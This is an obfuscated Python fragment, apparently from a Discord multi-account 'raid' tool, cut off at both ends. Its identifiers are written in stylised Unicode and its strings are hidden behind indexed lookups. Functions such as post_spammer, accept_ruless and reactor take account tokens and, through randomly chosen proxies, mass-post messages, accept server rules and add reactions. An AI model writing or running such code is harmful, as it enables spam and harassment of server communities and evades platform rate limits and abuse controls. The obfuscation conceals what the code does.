    𝙥𝗮𝙮𝙡𝙤𝙖𝘥 = {𝗠𝘔𝗡𝙄𝗠𝘐𝗠𝗜𝙡𝙈𝗡𝙉𝙈𝘕𝙡𝗠𝗠𝙡𝘔𝘐𝗹𝙄𝙉𝙄𝙉𝙉𝙄𝙈𝘕𝗡𝗜𝗹[153]: 𝘯𝘢𝗺𝙚, 𝘔𝗠𝗡𝘐𝘔𝙄𝘔𝘐𝘭𝙈𝗡𝘕𝗠𝘕𝗹𝘔𝙈𝘭𝘔𝗜𝙡𝙄𝘕𝗜𝘕𝗡𝙄𝗠𝗡𝗡𝙄𝘭[305]: 11, 𝙈𝗠𝗡𝘐𝙈𝗜𝙈𝙄𝙡𝘔𝘕𝙉𝘔𝙉𝘭𝘔𝙈𝘭𝗠𝘐𝙡𝘐𝗡𝘐𝗡𝘕𝙄𝗠𝙉𝗡𝙄𝙡[306]: 4320, 𝘔𝘔𝗡𝙄𝙈𝙄𝙈𝗜𝗹𝘔𝗡𝙉𝘔𝙉𝘭𝙈𝘔𝙡𝗠𝙄𝙡𝗜𝘕𝘐𝗡𝘕𝘐𝙈𝙉𝗡𝙄𝗹[307]: 𝘔𝘔𝙉𝗜𝗠𝗜𝙈𝘐𝘭𝘔𝘕𝙉𝙈𝙉𝗹𝙈𝙈𝘭𝗠𝗜𝙡𝘐𝗡𝙄𝘕𝘕𝙄𝙈𝗡𝗡𝙄𝗹[308]}
    𝙙𝘯 = 𝙩𝘰𝘬𝗲𝙣.split(𝙈𝘔𝗡𝗜𝗠𝘐𝘔𝙄𝗹𝙈𝙉𝘕𝘔𝙉𝗹𝘔𝙈𝗹𝙈𝘐𝗹𝙄𝙉𝙄𝙉𝗡𝗜𝘔𝙉𝘕𝘐𝙡[247])
    𝙣𝘯 = 𝙙𝙣[0]
    for _ in 𝙧𝙖𝘯𝘨𝘦(1):
        if 𝙥𝗿𝗼𝘅𝘺:
            𝗿𝙧 = 𝘳𝗲𝙦𝘂𝘦𝙨𝘁𝙨.post(f'{𝙈𝙈𝗡𝗜𝗠𝗜𝗠𝗜𝙡𝘔𝙉𝙉𝙈𝘕𝗹𝙈𝘔𝙡𝘔𝗜𝗹𝗜𝙉𝘐𝙉𝗡𝘐𝙈𝘕𝘕𝘐𝘭[266]}{𝗰𝙝𝙖𝗻𝙣𝘦𝘭}{𝘔𝘔𝗡𝗜𝗠𝗜𝘔𝘐𝘭𝙈𝘕𝙉𝗠𝙉𝙡𝘔𝘔𝙡𝘔𝙄𝘭𝘐𝗡𝘐𝘕𝙉𝙄𝗠𝘕𝘕𝙄𝘭[309]}', headers=𝗵𝘦𝗮𝙙𝙚𝘳𝙨, json=𝗽𝙖𝘆𝗹𝗼𝘢𝗱, proxy={𝗠𝗠𝗡𝙄𝙈𝙄𝗠𝘐𝙡𝘔𝘕𝙉𝘔𝘕𝘭𝗠𝗠𝙡𝙈𝘐𝙡𝙄𝙉𝙄𝗡𝘕𝙄𝙈𝘕𝗡𝙄𝙡[244]: 𝙈𝘔𝗡𝗜𝙈𝘐𝗠𝘐𝗹𝘔𝗡𝗡𝗠𝘕𝘭𝗠𝘔𝘭𝗠𝘐𝗹𝗜𝘕𝗜𝙉𝘕𝗜𝗠𝗡𝗡𝗜𝘭[246] + 𝙧𝙖𝗻𝘥𝗼𝙢.choice(𝗽𝘳𝘰𝘹𝙞𝗲𝘴), 𝗠𝙈𝗡𝘐𝘔𝘐𝗠𝘐𝙡𝘔𝗡𝘕𝗠𝗡𝗹𝙈𝙈𝗹𝙈𝗜𝗹𝘐𝙉𝗜𝙉𝗡𝘐𝙈𝙉𝙉𝘐𝘭[245]: 𝘔𝘔𝘕𝗜𝗠𝗜𝗠𝙄𝘭𝗠𝗡𝙉𝙈𝙉𝙡𝗠𝘔𝗹𝗠𝗜𝘭𝘐𝘕𝗜𝘕𝗡𝙄𝘔𝘕𝗡𝙄𝗹[246] + 𝙧𝘢𝗻𝘥𝘰𝗺.choice(𝘱𝙧𝘰𝘅𝙞𝗲𝘴)})
        else:
            𝗿𝙧 = 𝘳𝗲𝗾𝘂𝘦𝘴𝘁𝘀.post(f'{𝗠𝙈𝗡𝙄𝘔𝗜𝗠𝗜𝙡𝘔𝙉𝙉𝘔𝘕𝗹𝘔𝗠𝙡𝙈𝘐𝗹𝗜𝙉𝘐𝗡𝘕𝘐𝙈𝘕𝙉𝙄𝗹[266]}{𝙘𝙝𝙖𝗻𝘯𝙚𝙡}{𝘔𝘔𝙉𝘐𝘔𝙄𝗠𝙄𝙡𝘔𝘕𝘕𝘔𝘕𝙡𝗠𝘔𝗹𝗠𝘐𝘭𝗜𝙉𝘐𝙉𝘕𝘐𝗠𝘕𝙉𝘐𝙡[309]}', headers=𝙝𝘦𝗮𝗱𝗲𝙧𝘀, json=𝙥𝙖𝙮𝗹𝙤𝘢𝘥)
    if 𝙧𝘳.status_code == 201:
        𝙥𝗿𝙞𝘯𝘁(f"{𝗿}{𝘔𝙈𝘕𝙄𝗠𝗜𝗠𝗜𝗹𝗠𝘕𝘕𝗠𝙉𝗹𝙈𝘔𝘭𝘔𝙄𝘭𝘐𝘕𝗜𝘕𝗡𝙄𝗠𝗡𝙉𝙄𝗹[91]}{𝘥𝘢𝘁𝙚𝘁𝙞𝙢𝘦.datetime.now().strftime(f'{𝗴}{𝙈𝘔𝘕𝘐𝙈𝘐𝘔𝘐𝘭𝙈𝘕𝙉𝗠𝘕𝗹𝗠𝘔𝘭𝙈𝘐𝙡𝙄𝘕𝙄𝗡𝘕𝗜𝗠𝗡𝗡𝘐𝘭[92]}{𝙧}')}{𝘔𝘔𝙉𝙄𝘔𝗜𝙈𝙄𝗹𝘔𝗡𝗡𝘔𝘕𝘭𝙈𝗠𝙡𝙈𝗜𝙡𝗜𝙉𝘐𝘕𝘕𝗜𝗠𝙉𝘕𝘐𝗹[93]}{𝗿}{𝙈𝗠𝙉𝗜𝘔𝙄𝙈𝙄𝙡𝙈𝗡𝘕𝘔𝗡𝘭𝘔𝗠𝗹𝗠𝙄𝗹𝗜𝙉𝗜𝘕𝙉𝙄𝗠𝘕𝗡𝙄𝗹[91]}{𝘭𝘤}{𝘔𝙈𝗡𝘐𝘔𝙄𝘔𝘐𝘭𝗠𝘕𝗡𝘔𝙉𝗹𝗠𝗠𝙡𝙈𝘐𝙡𝘐𝘕𝘐𝗡𝙉𝗜𝙈𝙉𝙉𝙄𝘭[301]}{𝗿}{𝙈𝘔𝘕𝗜𝘔𝗜𝘔𝙄𝘭𝘔𝙉𝗡𝗠𝙉𝙡𝗠𝘔𝗹𝙈𝘐𝗹𝘐𝗡𝙄𝗡𝘕𝙄𝙈𝘕𝘕𝘐𝗹[93]}{𝘯𝙣}{𝙜}{𝘔𝙈𝘕𝗜𝗠𝗜𝘔𝙄𝙡𝘔𝙉𝗡𝗠𝙉𝘭𝗠𝙈𝘭𝗠𝙄𝘭𝗜𝗡𝙄𝗡𝘕𝘐𝙈𝙉𝗡𝗜𝙡[249]}")
    else:
        𝗽𝗿𝙞𝙣𝘵(f"{𝙧}{𝘔𝙈𝘕𝘐𝘔𝗜𝗠𝙄𝘭𝙈𝙉𝗡𝙈𝙉𝗹𝙈𝙈𝗹𝙈𝘐𝙡𝗜𝘕𝗜𝗡𝗡𝘐𝘔𝘕𝘕𝙄𝗹[91]}{𝙙𝙖𝘵𝙚𝙩𝗶𝙢𝙚.datetime.now().strftime(f'{𝗴}{𝗠𝙈𝘕𝙄𝗠𝘐𝗠𝙄𝘭𝗠𝘕𝘕𝙈𝘕𝘭𝗠𝙈𝘭𝘔𝗜𝘭𝙄𝗡𝗜𝙉𝘕𝙄𝘔𝙉𝘕𝗜𝙡[92]}{𝘳}')}{𝙈𝙈𝘕𝘐𝗠𝘐𝗠𝘐𝘭𝘔𝗡𝗡𝘔𝙉𝙡𝘔𝗠𝘭𝙈𝘐𝘭𝙄𝗡𝘐𝘕𝘕𝙄𝗠𝙉𝗡𝗜𝘭[93]}{𝘳}{𝙈𝘔𝙉𝗜𝙈𝗜𝙈𝙄𝙡𝗠𝗡𝗡𝗠𝗡𝗹𝙈𝘔𝗹𝗠𝗜𝘭𝘐𝘕𝙄𝗡𝙉𝗜𝘔𝙉𝙉𝗜𝙡[91]}{𝘣}{𝙈𝙈𝗡𝗜𝙈𝙄𝘔𝘐𝗹𝙈𝙉𝙉𝗠𝘕𝘭𝙈𝗠𝙡𝗠𝙄𝗹𝙄𝗡𝙄𝗡𝙉𝗜𝙈𝙉𝘕𝗜𝙡[269]}{𝘳}{𝙈𝘔𝘕𝗜𝗠𝘐𝗠𝙄𝗹𝗠𝘕𝗡𝘔𝙉𝘭𝙈𝗠𝘭𝗠𝘐𝘭𝘐𝗡𝙄𝘕𝘕𝗜𝘔𝗡𝙉𝙄𝘭[93]}{𝘯𝗻}{𝗴}{𝗠𝙈𝗡𝙄𝙈𝙄𝘔𝙄𝘭𝙈𝙉𝘕𝘔𝘕𝙡𝘔𝙈𝙡𝗠𝙄𝙡𝘐𝙉𝘐𝙉𝙉𝗜𝘔𝗡𝘕𝗜𝙡[270]}{𝘳𝙧.text}")

def post_spammer(token, channel, name, msg):
    𝙝𝘦𝘢𝙙𝙚𝘳𝘴 = 𝗛𝘦𝘢𝙙𝙚𝗿𝘀(𝘁𝗼𝗸𝘦𝘯)
    𝘥𝘯 = 𝙩𝗼𝙠𝘦𝘯.split(𝗠𝗠𝙉𝙄𝗠𝙄𝗠𝘐𝙡𝘔𝗡𝘕𝙈𝘕𝗹𝘔𝘔𝙡𝙈𝙄𝗹𝙄𝗡𝙄𝙉𝘕𝘐𝘔𝘕𝗡𝘐𝘭[247])
    𝘯𝗻 = 𝙙𝘯[0]
    𝘱𝘢𝘆𝙡𝘰𝗮𝘥 = {𝘔𝙈𝘕𝘐𝗠𝙄𝙈𝗜𝗹𝗠𝗡𝙉𝙈𝙉𝙡𝙈𝗠𝗹𝘔𝗜𝘭𝙄𝘕𝗜𝙉𝗡𝙄𝘔𝙉𝘕𝙄𝗹[153]: 𝗻𝙖𝘮𝘦, 𝗠𝗠𝘕𝙄𝘔𝘐𝗠𝙄𝘭𝙈𝗡𝗡𝙈𝙉𝗹𝙈𝙈𝙡𝘔𝙄𝙡𝗜𝗡𝗜𝘕𝗡𝙄𝗠𝘕𝘕𝘐𝙡[306]: 4320, 𝙈𝙈𝗡𝗜𝙈𝙄𝗠𝘐𝙡𝘔𝙉𝘕𝗠𝘕𝗹𝙈𝙈𝙡𝘔𝗜𝘭𝘐𝙉𝘐𝘕𝙉𝘐𝘔𝗡𝙉𝘐𝗹[310]: [], 𝙈𝘔𝗡𝙄𝙈𝗜𝗠𝙄𝗹𝘔𝙉𝘕𝗠𝗡𝙡𝘔𝙈𝙡𝙈𝘐𝗹𝗜𝗡𝙄𝗡𝙉𝗜𝘔𝗡𝘕𝘐𝙡[148]: {𝙈𝙈𝙉𝗜𝗠𝙄𝘔𝘐𝗹𝘔𝘕𝗡𝘔𝗡𝙡𝗠𝙈𝘭𝗠𝗜𝘭𝗜𝘕𝗜𝙉𝘕𝘐𝘔𝗡𝙉𝙄𝘭[265]: 𝗺𝙨𝗴}}
    𝙨𝘭𝙚𝗲𝗽(1)
    if 𝙥𝘳𝘰𝘹𝘺:
        𝘳𝘳 = 𝙧𝙚𝙦𝘂𝘦𝘀𝙩𝘀.post(f'{𝘔𝗠𝘕𝘐𝙈𝘐𝗠𝗜𝘭𝗠𝘕𝙉𝙈𝗡𝘭𝘔𝗠𝙡𝗠𝘐𝙡𝗜𝗡𝘐𝗡𝗡𝘐𝙈𝘕𝗡𝗜𝗹[266]}{𝗰𝘩𝙖𝗻𝙣𝙚𝗹}{𝙈𝘔𝗡𝘐𝘔𝗜𝘔𝘐𝘭𝘔𝗡𝗡𝙈𝘕𝗹𝘔𝗠𝙡𝗠𝗜𝗹𝘐𝙉𝗜𝗡𝘕𝗜𝙈𝘕𝙉𝘐𝘭[311]}', json=𝙥𝘢𝙮𝘭𝘰𝘢𝗱, headers=𝗵𝗲𝘢𝙙𝘦𝙧𝘀, proxy={𝙈𝘔𝘕𝗜𝗠𝙄𝘔𝘐𝙡𝘔𝙉𝙉𝗠𝙉𝙡𝘔𝙈𝙡𝘔𝘐𝗹𝙄𝘕𝙄𝘕𝘕𝙄𝗠𝙉𝙉𝘐𝘭[244]: 𝘔𝗠𝙉𝗜𝙈𝙄𝘔𝙄𝙡𝗠𝘕𝘕𝙈𝙉𝙡𝘔𝗠𝗹𝘔𝙄𝘭𝙄𝙉𝙄𝘕𝗡𝘐𝙈𝙉𝙉𝙄𝙡[246] + 𝙧𝘢𝗻𝘥𝗼𝘮.choice(𝘱𝙧𝙤𝘅𝙞𝘦𝙨), 𝘔𝗠𝗡𝘐𝗠𝘐𝙈𝙄𝗹𝘔𝗡𝘕𝘔𝗡𝗹𝘔𝙈𝙡𝙈𝘐𝙡𝙄𝗡𝗜𝘕𝗡𝙄𝘔𝗡𝗡𝘐𝘭[245]: 𝙈𝙈𝗡𝗜𝘔𝙄𝗠𝘐𝘭𝘔𝙉𝙉𝙈𝘕𝙡𝗠𝙈𝗹𝗠𝙄𝙡𝘐𝗡𝘐𝙉𝘕𝙄𝘔𝗡𝙉𝘐𝙡[246] + 𝘳𝘢𝙣𝙙𝗼𝗺.choice(𝘱𝘳𝗼𝙭𝙞𝗲𝘴)})
    else:
        𝗿𝘳 = 𝗿𝘦𝘲𝘂𝗲𝘀𝙩𝘀.post(f'{𝙈𝗠𝙉𝙄𝗠𝘐𝗠𝘐𝙡𝗠𝙉𝙉𝘔𝗡𝙡𝗠𝙈𝙡𝙈𝘐𝙡𝘐𝘕𝘐𝗡𝙉𝗜𝘔𝙉𝙉𝙄𝗹[266]}{𝗰𝙝𝗮𝘯𝗻𝘦𝙡}{𝘔𝗠𝘕𝗜𝘔𝙄𝗠𝗜𝙡𝗠𝘕𝘕𝗠𝗡𝘭𝗠𝘔𝘭𝘔𝘐𝗹𝗜𝗡𝙄𝗡𝙉𝗜𝙈𝘕𝘕𝗜𝘭[311]}', json=𝘱𝙖𝘆𝘭𝗼𝗮𝙙, headers=𝙝𝘦𝙖𝙙𝙚𝗿𝘀)
    if 𝙧𝗿.status_code == 201:
        𝙥𝙧𝙞𝗻𝙩(f"{𝙧}{𝗠𝙈𝘕𝗜𝗠𝗜𝙈𝙄𝗹𝘔𝗡𝙉𝙈𝗡𝘭𝙈𝗠𝗹𝘔𝗜𝘭𝙄𝘕𝗜𝙉𝙉𝘐𝗠𝘕𝗡𝘐𝘭[91]}{𝘥𝗮𝘵𝗲𝘁𝙞𝘮𝙚.datetime.now().strftime(f'{𝘨}{𝙈𝘔𝗡𝗜𝘔𝗜𝘔𝘐𝙡𝙈𝘕𝙉𝙈𝙉𝘭𝗠𝗠𝘭𝙈𝗜𝙡𝙄𝗡𝘐𝙉𝘕𝘐𝗠𝘕𝘕𝘐𝘭[92]}{𝗿}')}{𝗠𝗠𝘕𝙄𝘔𝗜𝗠𝙄𝙡𝘔𝘕𝙉𝗠𝙉𝗹𝘔𝘔𝘭𝙈𝙄𝙡𝘐𝗡𝗜𝘕𝙉𝙄𝙈𝗡𝙉𝘐𝙡[93]}{𝗿}{𝙈𝘔𝘕𝙄𝘔𝘐𝙈𝙄𝙡𝙈𝘕𝘕𝗠𝗡𝗹𝙈𝙈𝙡𝙈𝘐𝗹𝗜𝙉𝗜𝙉𝗡𝗜𝗠𝗡𝗡𝗜𝘭[91]}{𝗹𝘤}{𝙈𝙈𝘕𝗜𝙈𝙄𝙈𝙄𝗹𝗠𝘕𝙉𝙈𝗡𝗹𝗠𝙈𝗹𝘔𝙄𝘭𝗜𝙉𝘐𝙉𝘕𝘐𝗠𝙉𝗡𝘐𝗹[301]}{𝙧}{𝘔𝗠𝗡𝙄𝙈𝘐𝗠𝙄𝘭𝙈𝘕𝙉𝘔𝗡𝙡𝗠𝙈𝘭𝘔𝘐𝘭𝗜𝗡𝙄𝙉𝗡𝗜𝗠𝘕𝗡𝗜𝘭[93]}{𝙣𝙣}{𝗴}{𝗠𝗠𝙉𝘐𝗠𝗜𝗠𝗜𝗹𝙈𝗡𝙉𝘔𝙉𝗹𝘔𝗠𝗹𝘔𝘐𝗹𝗜𝙉𝙄𝗡𝙉𝘐𝗠𝗡𝘕𝙄𝗹[249]}")
    else:
        𝙥𝘳𝘪𝙣𝘵(f"{𝗿}{𝙈𝘔𝘕𝙄𝙈𝘐𝘔𝙄𝗹𝙈𝙉𝗡𝘔𝘕𝗹𝗠𝙈𝘭𝘔𝗜𝗹𝘐𝘕𝘐𝘕𝗡𝙄𝙈𝙉𝘕𝗜𝗹[91]}{𝙙𝗮𝙩𝘦𝘵𝙞𝗺𝗲.datetime.now().strftime(f'{𝗴}{𝙈𝗠𝗡𝙄𝗠𝙄𝙈𝙄𝘭𝘔𝙉𝗡𝙈𝙉𝙡𝘔𝙈𝘭𝗠𝙄𝙡𝙄𝗡𝗜𝘕𝘕𝘐𝘔𝘕𝙉𝙄𝘭[92]}{𝗿}')}{𝘔𝙈𝗡𝗜𝙈𝘐𝗠𝘐𝗹𝘔𝗡𝘕𝙈𝘕𝙡𝗠𝘔𝘭𝗠𝗜𝘭𝙄𝗡𝙄𝘕𝙉𝘐𝘔𝗡𝗡𝙄𝘭[93]}{𝗿}{𝙈𝘔𝘕𝘐𝘔𝙄𝙈𝗜𝗹𝘔𝘕𝙉𝘔𝘕𝗹𝙈𝙈𝘭𝙈𝙄𝗹𝙄𝙉𝙄𝘕𝙉𝗜𝗠𝘕𝗡𝗜𝗹[91]}{𝙗}{𝗠𝙈𝘕𝘐𝙈𝘐𝙈𝘐𝘭𝙈𝗡𝗡𝙈𝙉𝘭𝗠𝘔𝙡𝘔𝙄𝗹𝙄𝙉𝙄𝘕𝘕𝙄𝙈𝘕𝙉𝘐𝘭[269]}{𝙧}{𝙈𝘔𝗡𝙄𝙈𝗜𝗠𝗜𝗹𝗠𝘕𝗡𝘔𝙉𝗹𝙈𝗠𝘭𝘔𝘐𝙡𝗜𝙉𝙄𝙉𝙉𝘐𝘔𝘕𝙉𝘐𝗹[93]}{𝙣𝘯}{𝘨}{𝗠𝗠𝘕𝙄𝙈𝘐𝘔𝙄𝗹𝙈𝙉𝙉𝙈𝙉𝙡𝙈𝙈𝗹𝙈𝘐𝘭𝗜𝘕𝙄𝗡𝙉𝘐𝘔𝘕𝗡𝘐𝙡[270]}{𝗿𝗿.text}")

def accept_ruless(token, guild):
    𝙙𝙣 = 𝘵𝙤𝗸𝙚𝙣.split(𝗠𝗠𝘕𝙄𝙈𝘐𝘔𝘐𝘭𝙈𝗡𝗡𝘔𝙉𝘭𝙈𝙈𝘭𝙈𝙄𝙡𝙄𝘕𝘐𝘕𝗡𝗜𝘔𝗡𝘕𝙄𝗹[247])
    𝗻𝗻 = 𝗱𝗻[0]
    𝘩𝘦𝙖𝗱𝗲𝙧𝘴 = 𝗛𝘦𝗮𝘥𝙚𝗿𝘀(𝘵𝗼𝙠𝘦𝗻)
    try:
        if 𝘱𝗿𝘰𝘹𝘺:
            𝗻𝗶𝘨 = 𝘳𝗲𝙦𝘂𝗲𝙨𝘁𝙨.get(f'{𝙈𝘔𝗡𝘐𝙈𝘐𝙈𝗜𝙡𝗠𝙉𝗡𝘔𝗡𝗹𝙈𝘔𝘭𝗠𝗜𝘭𝘐𝙉𝘐𝗡𝙉𝙄𝘔𝘕𝙉𝙄𝘭[152]}{𝘨𝘂𝘪𝙡𝘥}{𝗠𝗠𝗡𝙄𝗠𝙄𝙈𝘐𝗹𝘔𝙉𝗡𝙈𝙉𝗹𝗠𝘔𝗹𝘔𝘐𝗹𝘐𝙉𝙄𝗡𝙉𝘐𝙈𝘕𝗡𝙄𝗹[312]}', headers=𝙝𝘦𝙖𝗱𝗲𝗿𝘴, proxy={𝘔𝗠𝘕𝗜𝘔𝘐𝙈𝗜𝗹𝙈𝙉𝙉𝘔𝗡𝘭𝗠𝘔𝙡𝙈𝙄𝙡𝙄𝙉𝙄𝘕𝘕𝙄𝘔𝘕𝗡𝗜𝗹[244]: 𝘔𝗠𝙉𝗜𝗠𝘐𝙈𝘐𝗹𝙈𝘕𝙉𝗠𝘕𝙡𝘔𝙈𝙡𝙈𝙄𝗹𝗜𝙉𝙄𝘕𝙉𝗜𝗠𝗡𝘕𝗜𝘭[246] + 𝗿𝙖𝘯𝙙𝗼𝙢.choice(𝙥𝙧𝗼𝙭𝗶𝘦𝘀), 𝘔𝘔𝙉𝗜𝙈𝘐𝘔𝙄𝘭𝗠𝙉𝙉𝙈𝗡𝘭𝙈𝘔𝗹𝘔𝗜𝗹𝗜𝘕𝙄𝘕𝙉𝘐𝗠𝙉𝘕𝗜𝗹[245]: 𝙈𝙈𝘕𝘐𝘔𝗜𝙈𝗜𝘭𝙈𝙉𝘕𝘔𝘕𝗹𝘔𝗠𝗹𝗠𝗜𝙡𝗜𝙉𝘐𝗡𝙉𝘐𝘔𝗡𝗡𝗜𝘭[246] + 𝗿𝙖𝗻𝙙𝗼𝘮.choice(𝙥𝗿𝘰𝘅𝗶𝘦𝘀)}).json()
        else:
            𝗻𝘪𝘨 = 𝙧𝘦𝘲𝙪𝗲𝙨𝘵𝙨.get(f'{𝘔𝗠𝘕𝗜𝘔𝘐𝘔𝙄𝘭𝗠𝗡𝙉𝙈𝗡𝗹𝙈𝗠𝘭𝙈𝙄𝙡𝘐𝘕𝘐𝗡𝙉𝙄𝙈𝙉𝗡𝘐𝘭[152]}{𝗴𝙪𝗶𝗹𝙙}{𝗠𝗠𝙉𝗜𝗠𝙄𝗠𝗜𝗹𝙈𝙉𝙉𝗠𝙉𝙡𝙈𝗠𝗹𝙈𝘐𝗹𝙄𝗡𝘐𝗡𝗡𝘐𝗠𝘕𝘕𝗜𝗹[312]}', headers=𝗵𝗲𝗮𝙙𝙚𝗿𝘀).json()
        if 𝘱𝗿𝗼𝘹𝙮:
            𝘳𝗿 = 𝘳𝘦𝘲𝙪𝙚𝘴𝙩𝘀.put(f'{𝘔𝙈𝘕𝗜𝗠𝘐𝙈𝗜𝗹𝙈𝗡𝙉𝙈𝘕𝗹𝗠𝘔𝗹𝗠𝘐𝗹𝗜𝗡𝙄𝘕𝙉𝗜𝙈𝗡𝘕𝙄𝙡[152]}{𝙜𝘶𝙞𝙡𝗱}{𝗠𝗠𝗡𝗜𝘔𝙄𝗠𝗜𝙡𝘔𝗡𝙉𝗠𝙉𝗹𝘔𝘔𝗹𝗠𝙄𝘭𝘐𝘕𝙄𝗡𝗡𝗜𝙈𝙉𝙉𝘐𝗹[313]}', headers=𝙝𝙚𝗮𝘥𝘦𝙧𝘀, json=𝗻𝙞𝙜, proxy={𝗠𝗠𝙉𝙄𝘔𝙄𝘔𝗜𝘭𝘔𝘕𝙉𝘔𝙉𝗹𝗠𝘔𝘭𝗠𝘐𝙡𝘐𝘕𝘐𝙉𝙉𝗜𝙈𝗡𝘕𝙄𝙡[244]: 𝙈𝘔𝙉𝘐𝘔𝙄𝙈𝙄𝗹𝘔𝙉𝗡𝗠𝙉𝗹𝘔𝘔𝘭𝘔𝘐𝗹𝗜𝘕𝘐𝘕𝗡𝙄𝗠𝗡𝗡𝙄𝙡[246] + 𝙧𝙖𝙣𝙙𝘰𝗺.choice(𝙥𝗿𝘰𝘹𝗶𝙚𝘴), 𝘔𝙈𝙉𝙄𝘔𝙄𝘔𝗜𝗹𝘔𝗡𝙉𝘔𝘕𝘭𝙈𝘔𝙡𝗠𝘐𝙡𝘐𝗡𝗜𝘕𝘕𝗜𝗠𝙉𝘕𝙄𝙡[245]: 𝗠𝘔𝗡𝗜𝗠𝙄𝗠𝗜𝘭𝗠𝘕𝗡𝗠𝙉𝘭𝗠𝗠𝗹𝘔𝗜𝗹𝙄𝗡𝗜𝙉𝙉𝗜𝗠𝙉𝗡𝙄𝙡[246] + 𝗿𝗮𝙣𝗱𝗼𝗺.choice(𝗽𝘳𝗼𝘅𝘪𝘦𝘀)})
        else:
            𝗿𝘳 = 𝗿𝙚𝙦𝘂𝘦𝘴𝘁𝘀.put(f'{𝙈𝙈𝗡𝙄𝙈𝙄𝙈𝙄𝘭𝗠𝗡𝙉𝘔𝙉𝗹𝙈𝙈𝙡𝙈𝗜𝗹𝗜𝘕𝘐𝘕𝙉𝗜𝗠𝗡𝘕𝙄𝘭[152]}{𝘨𝘂𝙞𝗹𝙙}{𝘔𝙈𝗡𝗜𝗠𝙄𝙈𝙄𝙡𝗠𝘕𝘕𝙈𝙉𝙡𝙈𝘔𝘭𝘔𝙄𝗹𝙄𝗡𝗜𝘕𝗡𝗜𝙈𝗡𝘕𝗜𝘭[313]}', headers=𝘩𝙚𝘢𝗱𝙚𝘳𝘀, json=𝙣𝙞𝘨)
    except:
        pass
    if 𝙧𝘳.status_code == 201:
        𝗽𝘳𝙞𝙣𝘵(f"{𝘳}{𝘔𝗠𝙉𝗜𝙈𝙄𝘔𝘐𝙡𝙈𝙉𝘕𝘔𝙉𝘭𝘔𝗠𝙡𝗠𝙄𝘭𝗜𝙉𝗜𝙉𝗡𝘐𝗠𝘕𝘕𝗜𝙡[91]}{𝙙𝗮𝘁𝗲𝙩𝘪𝗺𝘦.datetime.now().strftime(f'{𝗴}{𝙈𝗠𝘕𝙄𝙈𝙄𝗠𝗜𝗹𝙈𝙉𝘕𝙈𝗡𝙡𝙈𝘔𝙡𝗠𝗜𝘭𝙄𝙉𝘐𝙉𝘕𝙄𝗠𝘕𝙉𝗜𝘭[92]}{𝙧}')}{𝙈𝗠𝘕𝘐𝘔𝗜𝗠𝙄𝘭𝗠𝗡𝘕𝗠𝗡𝙡𝗠𝙈𝘭𝗠𝘐𝙡𝙄𝙉𝙄𝗡𝙉𝙄𝘔𝘕𝘕𝙄𝗹[93]}{𝗿}{𝙈𝙈𝘕𝙄𝗠𝗜𝙈𝙄𝘭𝗠𝘕𝗡𝙈𝙉𝘭𝗠𝘔𝙡𝘔𝘐𝙡𝘐𝘕𝙄𝙉𝙉𝙄𝗠𝗡𝗡𝘐𝙡[91]}{𝗹𝘤}{𝗠𝙈𝙉𝘐𝙈𝙄𝗠𝘐𝗹𝙈𝗡𝘕𝘔𝗡𝗹𝙈𝘔𝙡𝘔𝙄𝘭𝘐𝗡𝙄𝗡𝙉𝙄𝘔𝙉𝘕𝙄𝗹[301]}{𝗿}{𝘔𝙈𝘕𝗜𝙈𝘐𝘔𝗜𝘭𝘔𝗡𝘕𝘔𝙉𝘭𝙈𝗠𝗹𝗠𝙄𝗹𝗜𝘕𝘐𝘕𝘕𝙄𝘔𝙉𝘕𝙄𝗹[93]}{𝙣𝙣}{𝗠𝗠𝘕𝘐𝗠𝙄𝘔𝗜𝗹𝗠𝙉𝙉𝙈𝙉𝗹𝙈𝙈𝗹𝗠𝙄𝘭𝘐𝘕𝗜𝙉𝙉𝗜𝘔𝘕𝘕𝙄𝘭[249]}{𝙜}")
    else:
        𝗽𝗿𝗶𝙣𝘵(f"{𝘳}{𝙈𝘔𝙉𝙄𝗠𝗜𝘔𝘐𝗹𝗠𝗡𝗡𝘔𝘕𝙡𝘔𝗠𝘭𝗠𝗜𝘭𝗜𝙉𝘐𝘕𝙉𝗜𝗠𝙉𝙉𝙄𝗹[91]}{𝙙𝙖𝙩𝙚𝘁𝗶𝙢𝙚.datetime.now().strftime(f'{𝙜}{𝘔𝘔𝗡𝙄𝘔𝗜𝙈𝘐𝙡𝙈𝘕𝘕𝙈𝘕𝘭𝙈𝘔𝗹𝙈𝘐𝘭𝙄𝙉𝗜𝙉𝗡𝘐𝙈𝙉𝗡𝙄𝘭[92]}{𝗿}')}{𝙈𝙈𝘕𝗜𝗠𝙄𝗠𝗜𝘭𝗠𝙉𝘕𝗠𝗡𝗹𝘔𝙈𝙡𝗠𝘐𝘭𝗜𝙉𝘐𝙉𝙉𝙄𝘔𝘕𝘕𝘐𝙡[93]}{𝘳}{𝙈𝘔𝘕𝘐𝙈𝘐𝘔𝗜𝘭𝙈𝗡𝘕𝘔𝘕𝘭𝗠𝘔𝙡𝘔𝘐𝗹𝗜𝗡𝘐𝗡𝙉𝗜𝘔𝗡𝗡𝘐𝙡[91]}{𝙡𝗰}{𝘔𝙈𝗡𝘐𝗠𝘐𝙈𝙄𝘭𝙈𝙉𝗡𝙈𝘕𝙡𝙈𝘔𝘭𝗠𝘐𝗹𝗜𝙉𝙄𝙉𝘕𝗜𝘔𝙉𝘕𝘐𝘭[314]}{𝘳}{𝙈𝙈𝘕𝘐𝘔𝘐𝘔𝙄𝗹𝗠𝘕𝗡𝙈𝙉𝙡𝘔𝗠𝘭𝙈𝗜𝘭𝘐𝙉𝙄𝙉𝙉𝘐𝗠𝗡𝘕𝘐𝙡[93]}{𝙣𝙣}{𝗠𝘔𝙉𝗜𝗠𝙄𝙈𝗜𝙡𝙈𝘕𝙉𝗠𝘕𝙡𝗠𝙈𝗹𝗠𝗜𝘭𝙄𝘕𝘐𝙉𝗡𝗜𝘔𝙉𝙉𝘐𝗹[249]}{𝗴}{𝗿𝗿.text}")

def reactor(token, emoji, message_link):
    𝗵𝘦𝘢𝗱𝙚𝙧𝘴 = 𝗛𝙚𝗮𝗱𝙚𝙧𝘴(𝘁𝘰𝙠𝘦𝙣)
    𝗰𝘩𝙖𝗻𝗻𝗲𝘭_𝘪𝘥 = 𝙢𝗲𝙨𝘀𝙖𝘨𝘦_𝙡𝙞𝙣𝘬.split(𝙈𝗠𝗡𝙄𝘔𝙄𝙈𝗜𝙡𝙈𝙉𝙉𝙈𝘕𝙡𝗠𝙈𝙡𝗠𝘐𝘭𝗜𝙉𝘐𝗡𝗡𝗜𝙈𝙉𝘕𝙄𝗹[315])[5]
